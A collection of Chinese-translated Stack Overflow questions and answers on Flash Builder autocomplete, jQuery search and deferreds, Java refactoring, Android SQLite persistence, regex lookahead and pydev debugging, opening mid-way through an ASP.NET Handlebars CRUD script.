                <label for="dateDue">Due Date:</label><input type="date" value="{{D_DateDue}}" id="dateDue" />
            </p>
        </section>
        <input type="submit" id="saveOnus" />
        </form>
    </section>
</script>

@section scripts{
    <script src="~/Scripts/handlebars.js"></script>
    <script>
        var onusServer = (function () {
            var onusApiUrl = '@Url.RouteUrl("DefaultApi", new { httproute="", controller = "onus" })';
            $(document).ajaxError(function (event, xhr) {
                alert(xhr.status + ":" + xhr.statusText);
            });

            //**Calling the controller**//
            var getOnuses = function () {
                return $.ajax(onusApiUrl)
            };

            var getOnus = function (id) {
                return $.ajax(onusApiUrl + "/" + id)
            };

            var updateOnus = function (onus) {
                return $.ajax(onusApiUrl + "/" + onus.Id, {
                    type: "PUT",
                    data: onus
                });
            };

            var addOnus = function (onus) {
                return $.ajax(onusApiUrl, {
                    type: "POST",
                    data: onus
                });
            };

            var deleteOnus = function (id) {
                return $.ajax(onusApiUrl + "/" + id, {
                    type: "DELETE"
                });
            };
            return {
                getOnuses: getOnuses,
                getOnus: getOnus,
                updateOnus: updateOnus,
                addOnus: addOnus,
                deleteOnus: deleteOnus
            };
        }());

        (function () {
            var templates = {};

            var compileTemplates = function () {
                var source = $("#list").html();
                templates.onusList = Handlebars.compile(source);
                templates.onusDetails = Handlebars.compile($("#Details").html());2
                templates.onusCreate = Handlebars.compile($("#Create").html());
            };

            var getAllOnuses = function () {
                onusServer.getOnuses().done(showAllOnuses);
            };

            var editOnus = function () {
                var id = getId(this);
                onusServer.getOnus(id).done(showOnusForEdit)
            };

            var saveOnus = function () {
                var onus = {
                    "Id": $("#id").val(),
                    "Title": $("#title").val(),
                    "Description": $("#desc").val(),
                    "Details": $("#details").val(),
                    "Recurring": $("#recurring").val()

                };
                var operation;
                if (onus.Id != "0") { //if zero assumes it is a POST
                    operation = onusServer.updateOnus(onus);
                } else {
                    operation = onusServer.addOnus(onus);
                }
                operation.done(getAllOnuses, clearEdit);
                return false;
            };

            var createOnus = function () {
                var onus = { Id: 0, Title: "", Length: 0 };
                showOnusForEdit(onus);
            };

            var deleteOnus = function () {
                var id = getId(this);
                onusServer.deleteOnus(id).done(getAllOnuses);
            };

            var showAllOnuses = function (data) {
                var output = templates.onusList({ onus: data });
                $("#ListOutput").html(output);
            };

            var showOnusForEdit = function (onus) {
                var output = templates.onusCreate(onus);
                $("#CreateOutput").html(output);
            };

            var wireEvents = function () {
                $(document).on("click", ".editOnus", editOnus);
                $(document).on("click", "#saveOnus", saveOnus);
                $(document).on("click", "#createOnus", createOnus);
                $(document).on("click", ".deleteOnus", deleteOnus);
            };

            var getId = function (element) {
                return $(element).parents("section").attr("data-id");
            };

            var clearEdit = function () {
                $("#CreateOutput").empty();
            };
            $(function () {
                wireEvents();
                compileTemplates();
                getAllOnuses();
            });
        }());
    </script>
} 
```

# eclipse - Flash Builder 不显示 XML 或 XMLList 类的成员

> ID：11702118
> 
> 赞同：5
> 
> 时间：2012-07-28T15:03:59.950
> 
> 标签：eclipse, autocomplete, flash-builder

突然之间，Flash Builder 不再显示用于代码完成的 XML 或 XMLList 类的成员。我做了一些实验，用新的空项目创建了一个全新的工作区（以确保它不是我的主要工作集中的一些损坏），并且似乎该错误仅影响 Flex 项目；Flash Professional 项目仍然有效。

Flash Builder 版本是最新的 (4.6)，它基于 Eclipse 3.7。

一张图片会更清楚地显示这一点：

*   在 Flash Professional 项目中：在类型变量的名称后键入`.`或点击会显示成员列表： `CTRL + Space``XML`![Flash Professional 项目的自动完成功能](../Images/650f6e1c8aba32a74b2e8ac97f83c86a.png)

*   在 Flex 库项目中，仅`Object`显示默认成员： ![Flex Libarary 项目的自动完成功能](../Images/6a5f128d8e99aa372d79b8b6dd8ffeb7.png)

*   在 Flex 项目中，仅`Object`显示默认成员： ![Flex项目的自动完成](../Images/62c8c28900db8fdeeb145893390b8474.png)

今天早上我确实安装了一些用于编辑 XML 和 XSD 文件的 Eclipse Web 组件的更新组件......

[我确实查看了Flash Builder 4 突然停止对某些类进行自动完成](https://stackoverflow.com/questions/5826249/flash-builder-4-suddenly-stops-doing-auto-complete-for-some-classes)的各种提示，但它们似乎并没有影响这种情况——特别是因为它出现在一个只有 3 个小项目的全新工作区中。

**更新**我完全卸载并重新安装了 Flash Builder。问题依然存在。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T09:51:14.953

就在几分钟前，这发生在我身上。但不是用xml。我正在使用flare3D并用新版本更改了swc文件。最初它会抛出错误，将数据成员（Mesh3D.surfaces）识别为未知。我首先认为新版本已更改名称或删除了数据成员。但是，当我进行更多调试时，我发现它无法识别任何数据成员（其中没有显示任何数据成员）。但它在我的另一个项目是 FB4.0 中工作/显示，但我不确定它是否与 FB 版本有关。

然后经过各种尝试，如关闭、打开、重新导入库、重新启动 IDE 等，我创建了一个新项目（在 4.6 中）并复制了文件。那是魔术。希望它也适合你。

# javascript - 使用 Jquery 搜索 - 处理多个术语

> ID：11702120
> 
> 赞同：0
> 
> 时间：2012-07-28T15:04:04.087
> 
> 标签：javascript, jquery, search

我在网上找到了这个很棒的片段，以获取可搜索的常见问题解答。但是，我想知道是否有人知道如何修改它以使用多个术语。

[http://jsfiddle.net/pT6dB/](http://jsfiddle.net/pT6dB/)

在上面的示例中，我想输入“paper Earth”以返回两个示例结果。如果我现在输入它，它不会返回任何东西。我想我想让它等同于搜索“纸”或“地球”。

任何帮助将非常感激。

詹姆士

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:16:41.977

您可以做的是将搜索字符串与正则表达式进行匹配以获取所有单词。然后，为每个`li`您检查其文本是否包含任何单词并适当地显示或隐藏。不过，我使用`array.some`的是仅在较新的浏览器上可用的。

我也对其进行了一些整理-并非所有代码都是必需的：http: [//jsfiddle.net/pT6dB/29/](http://jsfiddle.net/pT6dB/29/)。

```
// no need for preventDefault here - clicking a <strong> doesn't do anything
$('li strong').click(function(e) {
    $(this).parent().find('em').slideToggle();
});

// the "input" event is available on newer browsers, and is also fired when e.g.
// pasting or dragging text
$('#search').on("input", function(e) {
    // make it case-insensitive, and match against a regexp that matches
    // non-space characters
    var words = $(this).val().toLowerCase().match(/\S+/g);
    if (!words) {  // no match, i.e. no words found
        $('#result li').show();
    } else {
        $('#result li').each(function() {
            var text = $(this).text().toLowerCase();
            var show = words.some(function(word) {
                return ~text.indexOf(word);  // ~ with indexOf means "contains"
            });
            $(this).toggle(show);  // will show or hide depending on "show"
        });
    }
}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-28T15:17:59.573

您需要使用 javascript string.split 函数按“”字符拆分值。然后循环遍历每个元素以查看是否有匹配项。

例如：

```
 $('#search').keyup(function(e) {
        var s = $(this).val().trim();
        if (s === '') {
            $('#result LI').show();
            return true;
        }

        $('#result LI').hide();

        splits = s.split(" ");

        for(x in splits){
            $('#result LI:contains(' + splits[x]+ ')').show();
        }

        return true;
    }); 
```

# java - 如何重构具有多个 if/else 语句的方法

> ID：11702121
> 
> 赞同：5
> 
> 时间：2012-07-28T15:04:22.680
> 
> 标签：java, refactoring

我觉得这个 if/else 应该被重构，但我不确定我能做什么，或者我是否应该让它保持原样......

```
private String someReportUrl(HttpServletRequest request, HttpServletResponse response) {
    String url;
    if (isBackToReportsSummary(request)) {
        url = SUMMARY_PAGE;
        getReportsSummary(request, response);
    } else if (isComingFromPageA(request)) {
        url = getTabUrl(request, REPORT_URL_FOR_PAGE_A);
    }
    else {
        url = "/standAlone/reportUrl.jsp";
    }
    return url;
} 
```

基本上我有一个报告摘要页面，其中列出了三到四个报告。第一个条件是用户想要返回该页面时，第二个条件是用户选择此特定报表时，第三个条件是用户选择此报表作为独立报表时（不是来自摘要页面） .

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-28T15:20:43.383

首先看一下[**设计模式命令**](http://www.zzrose.com/tech/pmr_sweDesignPatternCommand.html)。它应该重构`if/else`'s 的责任，使其更有条理和更易于维护。然后你的代码应该是这样的：

**例子**

```
class ExampleServlet  {

  private HashMap commandMap = new HashMap();

  public ExampleServlet() {
    commandMap.put("create", new ActionTypeCreate());
    commandMap.put("replace", new ActionTypeReplace());
    commandMap.put("update", new ActionTypeUpdate());
    commandMap.put("delete", new ActionTypeDelete());
  } //endconstructor
} //endclass: ExampleServlet

private void performTask(String action) {
    ActionType cmd = (ActionType)commandMap.get(action);
    cmd.execute();
} //endmethod: performTask 
```

*[**在这里**](http://sourcemaking.com/design_patterns/command)您可以收集更多关于命令模式的知识*

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-28T15:09:11.683

如果您绝对想更改它，您可以初始化`url`为默认返回，并且仅在满足两个条件之一时才更改它：

```
private String someReportUrl(HttpServletRequest request, HttpServletResponse response) {
    String url = "/standAlone/reportUrl.jsp";
    if (isBackToReportsSummary(request)) {
        url = SUMMARY_PAGE;
        getReportsSummary(request, response);
    } else if (isComingFromPageA(request)) {
        url = getTabUrl(request, REPORT_URL_FOR_PAGE_A);
    }
    return url;
} 
```

但实际上，这很好。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-07-28T15:11:24.103

这种“基于守卫”的风格怎么样？它通常使该方法更易于从上到下阅读。

```
private String someReportUrl(HttpServletRequest request, HttpServletResponse response) {
    if (isBackToReportsSummary(request)) {
        getReportsSummary(request, response);
        return SUMMARY_PAGE;
    } 
    if (isComingFromPageA(request)) {
        return getTabUrl(request, REPORT_URL_FOR_PAGE_A);
    }
    return "/standAlone/reportUrl.jsp";
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-28T15:38:13.527

你的代码就这样很好。但是你也可以考虑使用 ?: 运算符，如果你想在一行中实现同样的效果。

一个例子是：

```
class round{
    public static void main(String args[]){

    int sampleInt=3;
    if(sampleInt==1){
        sampleInt = 5;
        System.out.println("One");
    }
    else if(sampleInt==2){
    sampleInt = 3;
        System.out.println("Two");
    }
    else{
        sampleInt = 4;
        System.out.println("Else");
    }

    sampleInt = sampleInt==1?5:(sampleInt==2?3:4);
    System.out.println("sampleInt "+sampleInt);
}
} 
```

最后，您的代码将如下所示：

```
 url = isBackToReportsSummary(request)==true?SUMMARY_PAGE:(isComingFromPageA(request)==true?getTabUrl(request, REPORT_URL_FOR_PAGE_A):"/standAlone/reportUrl.jsp"); 
```

# android - Android：数据未永久存储在 SQLite 中

> ID：11702123
> 
> 赞同：0
> 
> 时间：2012-07-28T15:04:31.277
> 
> 标签：android, sqlite, service

我有一个调用远程服务器并从中获取数据的 Android 服务，我将数据存储在 SQLite 数据库中，一切正常，但是当我不调用该服务并在模拟器中再次执行时，我发现所有存储的数据消失了，数据库为空，是因为我在模拟器中运行项目并且它只将数据保存在某种缓存中吗？

谢谢

**编辑**

当我第二次运行该应用程序时，数据似乎在那里，但第三次它消失了。有时数据会在第二次或第四次运行时被擦除。

这是我的 Openhelper

```
public class DataBaseHelper extends SQLiteOpenHelper {

static final String dbName="DBlite2";
static final String tableMagasin= "magasin";
static final String tablenotif= "notification";
static final String tabletemp= "temporaire";
//colonnes de la table magasin
static final String colNomMag= "nomMag";
static final String colCategorie="categorie";
static final String colVille="ville";
static final String colAdresse="adresse";
static final String collat="latitude";
static final String collon="longitude";
static final String colDescr="description";
static final String colFavoris= "favori";
//colonnes de la table notifications
static final String colidNotif= "idnotif";
static final String colcontenu= "contenu";
static final String coldate= "datenotif";
static final String colvalidite= "validite";
static final String colnmnotif= "nmnotif";
static final String colctnotif= "ctnotif";
static final String colvlnotif= "vlnotif";

public DataBaseHelper(Context context)
{
    super(context,dbName ,null,1);

}

@Override
public void onCreate(SQLiteDatabase db) {
    // TODO Auto-generated method stub

    //création de la table magasin
    db.execSQL("CREATE TABLE "+tableMagasin+"("+colNomMag+" TEXT, "+ colCategorie +
        " TEXT, "+ colVille+" TEXT, "+colAdresse + " TEXT, "+ collat +
        " FLOAT, " + collon +" FLOAT, "+ colDescr+ " TEXT, " +
             colFavoris + " BIT,  PRIMARY KEY ( "+colNomMag+ " , "+colCategorie+" , "+colVille+" ));");

    //création de la table notification
    db.execSQL("CREATE TABLE "+tablenotif+"("+colidNotif+" INTEGER PRIMARY KEY,"+ colcontenu+" TEXT, "+coldate+" DATETIME, " 
            +colvalidite+" INTEGER, "+colnmnotif+" TEXT, "+colctnotif+" TEXT, "+colvlnotif+" TEXT, FOREIGN KEY ("
            +colnmnotif+") REFERENCES "+tableMagasin+" ( "+colNomMag+" ), FOREIGN KEY ( "+colctnotif+" ) REFERENCES "
            +tableMagasin+" ( "+colCategorie +" ), FOREIGN KEY("+ colvlnotif + ") REFERENCES "+ tableMagasin + " ("+ colVille+ "));");

    //création de la table tomporaire
    db.execSQL("CREATE TABLE "+tabletemp+"("+colidNotif+" INTEGER PRIMARY KEY,"+ colcontenu+" TEXT, "+coldate+" DATETIME, " 
            +colvalidite+" INTEGER, "+colnmnotif+" TEXT, "+colctnotif+" TEXT, "+colvlnotif+" TEXT, FOREIGN KEY ("
            +colnmnotif+") REFERENCES "+tableMagasin+" ( "+colNomMag+" ), FOREIGN KEY ( "+colctnotif+" ) REFERENCES "
            +tableMagasin+" ( "+colCategorie +" ), FOREIGN KEY("+ colvlnotif + ") REFERENCES "+ tableMagasin + " ("+ colVille+ "));");
}

@Override
public void onUpgrade(SQLiteDatabase arg0, int arg1, int arg2) {
    // TODO Auto-generated method stub

}

 @Override
 public String toString()
 {
     return (colNomMag + "\nCatégorie:" + colCategorie+ "\nVille:"+colVille);
  }
} 
```

而我在其中进行插入的班级，更新了删除：

```
public class MagasinDataSource {

private SQLiteDatabase db;
private DataBaseHelper dbhelper;
private String[] allcolumns = {DataBaseHelper.colNomMag,DataBaseHelper.colCategorie, DataBaseHelper.colVille,
        DataBaseHelper.colAdresse,DataBaseHelper.collat,DataBaseHelper.collon,DataBaseHelper.colDescr,DataBaseHelper.colFavoris};
private String[] notifcol={DataBaseHelper.colidNotif, DataBaseHelper.colcontenu, DataBaseHelper.coldate, DataBaseHelper.colvalidite,
        DataBaseHelper.colnmnotif,DataBaseHelper.colctnotif,DataBaseHelper.colvlnotif}; 
public MagasinDataSource(Context context)
{
    this.dbhelper= new DataBaseHelper(context);
}

public void open() throws SQLException {
    db = dbhelper.getWritableDatabase();
}

public void close() {
    dbhelper.close();
}

public long insertMag(Magasin ma)
{
    ContentValues values = new ContentValues();
    values.put(DataBaseHelper.colNomMag, ma.getNomMag());
    values.put(DataBaseHelper.colCategorie, ma.getCat());
    values.put(DataBaseHelper.colVille, ma.getVille());
    values.put(DataBaseHelper.colAdresse, ma.getAdr());
    values.put(DataBaseHelper.colDescr, ma.getDescr());
    values.put(DataBaseHelper.colFavoris, ma.isFav());
    values.put(DataBaseHelper.collat, ma.getLat());
    values.put(DataBaseHelper.collon, ma.getLon());
    return db.insert(DataBaseHelper.tableMagasin, null, values);
}

public long insertNotif(Notif n)
{
    ContentValues values = new ContentValues();
    values.put(DataBaseHelper.colidNotif, n.getId_notif());
    values.put(DataBaseHelper.colcontenu, n.getContenu());
    //values.put(DataBaseHelper.coldate, n.getDatenotif());
    values.put(DataBaseHelper.colvalidite, n.getValidite());
    values.put(DataBaseHelper.colnmnotif, n.getNmag());
    values.put(DataBaseHelper.colctnotif, n.getCtmag());
    values.put(DataBaseHelper.colvlnotif, n.getVlmag());
    return db.insert(DataBaseHelper.tablenotif, null, values);
}

public long inserttemp(Notif n)
{
    ContentValues values = new ContentValues();
    values.put(DataBaseHelper.colidNotif, n.getId_notif());
    values.put(DataBaseHelper.colcontenu, n.getContenu());
    //values.put(DataBaseHelper.coldate, n.getDatenotif());
    values.put(DataBaseHelper.colvalidite, n.getValidite());
    values.put(DataBaseHelper.colnmnotif, n.getNmag());
    values.put(DataBaseHelper.colctnotif, n.getCtmag());
    values.put(DataBaseHelper.colvlnotif, n.getVlmag());
    return db.insert(DataBaseHelper.tabletemp, null, values);
}

public void deleteMag(Magasin ma)
{
    db.delete(DataBaseHelper.tableMagasin, DataBaseHelper.colNomMag +" =?"  + " AND "+ DataBaseHelper.colCategorie+" =?"+ " AND "+ DataBaseHelper.colVille+" =?", new String []{String.valueOf(ma.getNomMag()),String.valueOf(ma.getCat()),String.valueOf(ma.getVille())});
}

public void deleteAllnotif()
{
    db.delete(DataBaseHelper.tablenotif, null, null);
}
public void deleteAlltemp()
{
    db.delete(DataBaseHelper.tabletemp, null, null);
}

public void deletAllmag()
{
    db.delete(DataBaseHelper.tableMagasin, null, null);
}

public void updateMag(Magasin ma)
{

    ContentValues values = new ContentValues();
    values.put(DataBaseHelper.colNomMag, ma.getNomMag());
    values.put(DataBaseHelper.colCategorie, ma.getCat());
    values.put(DataBaseHelper.colVille, ma.getVille());
    values.put(DataBaseHelper.colAdresse, ma.getAdr());
    values.put(DataBaseHelper.colDescr, ma.getDescr());
    values.put(DataBaseHelper.colFavoris, ma.isFav());

    db.update(DataBaseHelper.tableMagasin, values, DataBaseHelper.colNomMag +" =? AND "+DataBaseHelper.colCategorie+" =? AND "+DataBaseHelper.colVille+" =?" ,new String []{String.valueOf(ma.getNomMag()),String.valueOf(ma.getCat()),String.valueOf(ma.getVille())});
    // + " AND "+ DataBaseHelper.colCategorie+" = "+ct+ " AND "+ DataBaseHelper.colVille+" = "+ vl,null);
 //  db.execSQL("UPDATE "+ DataBaseHelper.tableMagasin+" SET "+DataBaseHelper.colNomMag+" = "+ma.getNomMag()+" , "+DataBaseHelper.colCategorie+" = "+ma.getCat()+" , "+DataBaseHelper.colVille+" = "+ma.getVille()+" , "+DataBaseHelper.colAdresse+" = "+ma.getAdr()+
    //     " , "+DataBaseHelper.colDescr+" = "+ma.getDescr()+" , "+DataBaseHelper.colVille+" = "+ma.isFav()+" WHERE "+DataBaseHelper.colNomMag+" = "+ma.getNomMag()+" AND "+DataBaseHelper.colCategorie+" = "+ma.getCat()+" AND "+DataBaseHelper.colVille+" = "+ma.getVille());
}

public List<Magasin> getFavoris()
{
    List<Magasin> lstfavoris = new ArrayList<Magasin>();
    String getfav= "select * from magasin where favori=1";
    Cursor cursor= db.rawQuery(getfav, null);
    cursor.moveToFirst();
    while (!cursor.isAfterLast()) {
        Magasin magasin= cursorToMagasin(cursor);
        lstfavoris.add(magasin);
        cursor.moveToNext();
    }
    cursor.close();
    return lstfavoris;
}

public List<Notif> getGeoloc(float latitude, float longitude)
{
    List<Magasin> lstgeo= new ArrayList<Magasin>();
    List<Notif> lstnotif= new ArrayList<Notif>();
    float latinf= latitude - (float) 0.5;
    float latsup= latitude + (float) 0.5;
    float loninf= longitude - (float) 0.5;
    float lonsup= longitude + (float) 0.5;
    String requete="select * from magasin where latitude > "+String.valueOf(latinf)+" and latitude < "+String.valueOf(latsup)+
              " and longitude > "+String.valueOf(loninf)+" and longitude < "+ String.valueOf(lonsup);
 //  String requete="select * from magasin where favori=1";
//  String requete="select * from notification";
    Cursor cursor= db.rawQuery(requete, null);
    cursor.moveToFirst();
    while (!cursor.isAfterLast())
    {
        Magasin mag= cursorToMagasin(cursor);
        lstgeo.add(mag);
        cursor.moveToNext();
    }
    cursor.close();
    for(int i=0;i<lstgeo.size();i++)
    {
        String nm= lstgeo.get(i).getNomMag();
        String ct= lstgeo.get(i).getCat();
        String vl= lstgeo.get(i).getVille();
        String requete2="select * from notification where nmnotif = '"+nm+"' and ctnotif = '"+ct+"' and vlnotif = '"+vl+"'";
   Cursor  cursor2= db.rawQuery(requete2, null);
   cursor2.moveToFirst();
        while (!cursor2.isAfterLast())
        {
            Notif notif= cursorToNotif(cursor2);
            lstnotif.add(notif);
            cursor2.moveToNext();
        }
        cursor2.close();
    }

    return lstnotif;
}

public List<Magasin> getAll()
{
    List<Magasin> lstall = new ArrayList<Magasin>();
    Cursor cursor= db.query(DataBaseHelper.tableMagasin,allcolumns, null, null, null, null, null);
    cursor.moveToFirst();
    while (!cursor.isAfterLast()) {
        Magasin magasin= cursorToMagasin(cursor);
        lstall.add(magasin);
        cursor.moveToNext();
    }
    cursor.close();
    return lstall;
}

public boolean existeMag(String nm,String ct,String vl)
{
    List<Magasin> lst= new ArrayList<Magasin>();
    lst= getAll();
    boolean b=false;
    String nom;
    String cat;
    String ville;
    for(int i=0;i<lst.size();i++)
    {
         nom= lst.get(i).getNomMag();
         cat= lst.get(i).getCat();
         ville=lst.get(i).getVille();
         if((nm.equals(nom)) && (ct.equals(cat)) && (vl.equals(ville)))
         {
             b=true;
             break;
         }
    }
    return b;
}

public Magasin getMagasin(String nm,String ct,String vl)
{
    List<Magasin> lst= new ArrayList<Magasin>();
    Magasin m= new Magasin();
    lst=getAll();
    String nom;
    String cat;
    String ville;
    for(int i=0;i<lst.size();i++)
    {
         nom= lst.get(i).getNomMag();
         cat= lst.get(i).getCat();
         ville=lst.get(i).getVille();
         if((nm.equals(nom)) && (ct.equals(cat)) && (vl.equals(ville)))
         {
             m=lst.get(i);
             break;
         }
    }
    return m;
}

public boolean existeNotif(Notif notif)
{
    List<Notif> lst= new ArrayList<Notif>();
    lst=getAllNotif();
    boolean b=false;

    for(int i=0;i<lst.size();i++)
    {
        Notif s= new Notif();
        s=lst.get(i);
        if(notif.getId_notif()==s.getId_notif())
        {
            b=true;
            break;
        }
    }
    return b;
}

public boolean existetemp(Notif notif)
{
    List<Notif> lst= new ArrayList<Notif>();
    lst=getAlltemp();
    boolean b=false;

    for(int i=0;i<lst.size();i++)
    {
        Notif s= new Notif();
        s=lst.get(i);
        if(notif.getId_notif()==s.getId_notif())
        {
            b=true;
            break;
        }
    }
    return b;
}

public List<Notif> getAllNotif()
{
    List<Notif> lstnotif= new ArrayList<Notif>();
    Cursor cursor= db.query(DataBaseHelper.tablenotif,notifcol, null, null, null, null, null);
    cursor.moveToFirst();
    while (!cursor.isAfterLast()) {
        Notif s= cursorToNotif(cursor);
        lstnotif.add(s);
        cursor.moveToNext();
    }
    cursor.close();
    return lstnotif;

}

public List<Notif> getAlltemp()
{
    List<Notif> lstnotif= new ArrayList<Notif>();
    Cursor cursor= db.query(DataBaseHelper.tabletemp,notifcol, null, null, null, null, null);
    cursor.moveToFirst();
    while (!cursor.isAfterLast()) {
        Notif s= cursorToNotif(cursor);
        lstnotif.add(s);
        cursor.moveToNext();
    }
    cursor.close();
    return lstnotif;
}

private Magasin cursorToMagasin(Cursor cursor) {
        Magasin magasin = new Magasin();
        magasin.setNomMag(cursor.getString(0));
        magasin.setCat(cursor.getString(1));
        magasin.setVille(cursor.getString(2));
        magasin.setAdr(cursor.getString(3));
        magasin.setLat(cursor.getFloat(4));
        magasin.setLon(cursor.getFloat(5));
        magasin.setDescr(cursor.getString(6));
        magasin.setFav(cursor.getInt(7)==1);
        return magasin;
    }

    private Notif cursorToNotif(Cursor cursor)
    {
        Notif n= new Notif();
        n.setId_notif(cursor.getInt(0));
        n.setContenu(cursor.getString(1));
        //n.setDatenotif(cursor.getString(2));
        n.setValidite(cursor.getInt(3));
        n.setNmag(cursor.getString(4));
        n.setCtmag(cursor.getString(5));
        n.setVlmag(cursor.getString(6));

        return n;
    }
} 
```

**编辑2**

这是我的服务代码：

```
public class SyncService extends Service {
 private MagasinDataSource datasource;

    protected LocationManager locationManager;
    public static ShopAlertActivity MAIN_ACTIVITY;      
    private Timer timer=new Timer();   
    private static long UPDATE_INTERVAL =  86400000;  //default
    private static long DELAY_INTERVAL = 10000;  
    public static void setMainActivity(ShopAlertActivity activity)
    {
      MAIN_ACTIVITY = activity;   

    }

@Override
public IBinder onBind(Intent arg0) {
    // TODO Auto-generated method stub
    return null;
}

 @Override
    public void onCreate()
    {
     SharedPreferences SP = PreferenceManager.getDefaultSharedPreferences(getBaseContext());
     String interval= SP.getString("synchronisation", "1");
    if(interval.equals("1")) UPDATE_INTERVAL= 43200000;
    if(interval.equals("2")) UPDATE_INTERVAL= 86400000;
    if(interval.equals("3")) UPDATE_INTERVAL= 115200000;
      super.onCreate();     

      _startService();

     // if (MAIN_ACTIVITY != null)  Log.d(getClass().getSimpleName(), "FileScannerService started");
    }
  /*
     * starting the service
     */
    private void _startService()
    {   

      timer.scheduleAtFixedRate(   

              new TimerTask() {

                    public void run() {

                        try{

                        doServiceWork();

                        Thread.sleep(UPDATE_INTERVAL);

                        }catch(InterruptedException ie){

                            Log.e(getClass().getSimpleName(), "FileScannerService InterruptedException"+ie.toString());
                        }

                    }
                  },
                  DELAY_INTERVAL,
                  UPDATE_INTERVAL);

      Log.i(getClass().getSimpleName(), "FileScannerService Timer started....");
    }
    /*
     * start the processing, the actual work, getting config params, get data from network etc
     */
    private void doServiceWork()
    {
        //avoir les préférences
         SharedPreferences SP = PreferenceManager.getDefaultSharedPreferences(getBaseContext());
         String interval= SP.getString("synchronisation", "1");
        if(interval.equals("1")) UPDATE_INTERVAL= 43200000;
        if(interval.equals("2")) UPDATE_INTERVAL= 86400000;
        if(interval.equals("3")) UPDATE_INTERVAL= 115200000;

    try{

         //call the distant web service
        soapclass sc= new soapclass("TabMag");
        soapclass cs= new soapclass("TabNotif");
        Magasin[] tab_mag=sc.get_table_magasin();
        Notif[] tab_notif=cs.get_table_notif();

         datasource = new MagasinDataSource(this); 
         datasource.open();

         //Delete existing data
         if(tab_mag.length>0)
         {
            // datasource.deletAllmag();
            // datasource.deleteAllnotif();
         }

         //Insert data received from web service in table magasin
         for(int i=0;i<tab_mag.length;i++)
         {
             Magasin m= new Magasin();
             m=tab_mag[i];
             if(lst_fav.contains(m))
             {
                 m.setFav(true);
             }
             datasource.insertMag(m);
         }
         //insert data in tab_notif
         for(int i=0;i<tab_notif.length;i++)
         {
             Notif n= new Notif();
             n= tab_notif[i];
             datasource.insertNotif(n);
         }
         datasource.close();

    }
    catch(Exception e)
    {

    }

    }
    /*
     * shutting down the service
     */
    private void _shutdownService()
    {
      if (timer != null) timer.cancel();

     // Log.i(getClass().getSimpleName(), "Timer stopped...");
    }
} 
```

# regex - 在非 perl 风格的正则表达式中向前/向后？

> ID：11702131
> 
> 赞同：0
> 
> 时间：2012-07-28T15:06:14.403
> 
> 标签：regex, grep

有没有办法在不使用的情况下向前/向后查看子字符串`initial(?!.*(substring))`？即，如果您无法访问perl，您如何搜索“initial”，然后使用正则表达式删除其后任何位置具有“substring”的任何匹配项？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T17:21:37.133

如果您搜索两个匹配项： (1)`initial`和 (2) `initial.*substring`，那么根据这两个结果您知道是否存在这样的匹配项。如果找到第一个匹配项而第二个未找到，则您的字符串包含“*初始*”，前面没有“*子字符串”...*

# python - pydev 调试器：OS 10.8 升级后无法找到 python 2.7 的真实位置

> ID：11702139
> 
> 赞同：10
> 
> 时间：2012-07-28T15:06:33.400
> 
> 标签：python, python-2.7, aptana, osx-mountain-lion

我刚刚升级到 OS X 10.8 Mountain Lion，无法理解 pydev 调试器在 Aptana 3.0 上的工作方式。

在 Aptana 的首选项中，我设置了位置为“/usr/bin/python”的 python 解释器。它指出系统库来自“/System/Library/Frameworks/Python.framework/Versions/2.7/...”

当我在 Aptana 中为我的 Google App Engine 项目启动调试器时，控制台会记录：

```
pydev debugger: CRITICAL WARNING: This version of python seems to be incorrectly compiled (internal generated filenames are not absolute)
pydev debugger: The debugger may still function, but it will work slower and may miss breakpoints. 
```

它还指出：

```
pydev debugger: Unable to find real location for: /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/threading.py
pydev debugger: Unable to find real location for: /Applications/Aptana Studio 3/plugins/org.python.pydev.debug_2.2.2.2011100512/pysrc/pydevd.py
pydev debugger: Unable to find real location for: /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/posixpath.py
... 
```

它列出了“/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/”文件夹中的所有 .py 文件。

我的应用引擎项目仍在加载，但我真的不明白为什么。我必须如何配置 Aptana 3.0，以及我的 OSX 10.7 和 10.8 之间发生了哪些变化导致这个严重警告出现？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-01T06:17:18.873

我有一个非常相似的问题。原来，升级到Mountain Lion之后，所有的Python源文件都消失了。

解决方案是从 Apple 安装“命令行工具”。试试这个链接：

[https://developer.apple.com/downloads/index.action?=command%20line%20tools](https://developer.apple.com/downloads/index.action?=command%20line%20tools)

或者去[https://developer.apple.com/opensource/](https://developer.apple.com/opensource/)找到“命令行工具”

# javascript - jQuery何时/完成序列中的竞争条件？

> ID：11702141
> 
> 赞同：1
> 
> 时间：2012-07-28T15:07:00.357
> 
> 标签：javascript, jquery, deferred

我有一个基于 apache、php、js/jquery 的网络应用程序。加载文档时初始化应用程序的一个模块。该序列调用一个执行许多任务的 init() 函数，除其他外，它通过 ajax 获取两个 html 对话框并将它们插入到现有页面中。对这些对话框的引用保存为变量，因此我不必在整个脚本中指定 jquery 选择器，而是可以简单地使用这些变量。这工作正常，除了在尝试将处理程序绑定到获取的对话框内的元素时变量“未定义”的情况很少（偶尔......）。这很奇怪，因为除了绑定之外，对话框在整个应用程序中都是可用的。这表明 ajax 调用成功，但显然存在某种竞争条件，*在*绑定尝试之后。

根据我的理解，这不应该发生，因为绑定是在 when() 的 .done() 部分完成的，并且只能在对话框的 ajax 检索在 when() 内完成后执行。

显然我在这里遗漏了一些基本的东西。有人对我有提示吗？

以下引用了工作实现的代码摘录。它们可能作为某些部分在语法上看起来无效，但这只是由于删除了与此处无关的代码部分。未缩短的代码工作正常。

变量：

```
Shorty.Tracking.Dialog.List:{};
Shorty.Tracking.Dialog.Click:{}; 
```

初始化顺序：

```
$(window).load(function(){
  //...
  var dfd = new $.Deferred();
  $.when(
    // load layout of dialog to show the list of tracked clicks
    Shorty.Tracking.init()
  ).done(function(){
    // bind actions to basic buttons
    Shorty.Tracking.Dialog.List.find('#close').on('click',function(){
      // ...
    });
    // ...
  });
  // ...
}) 
```

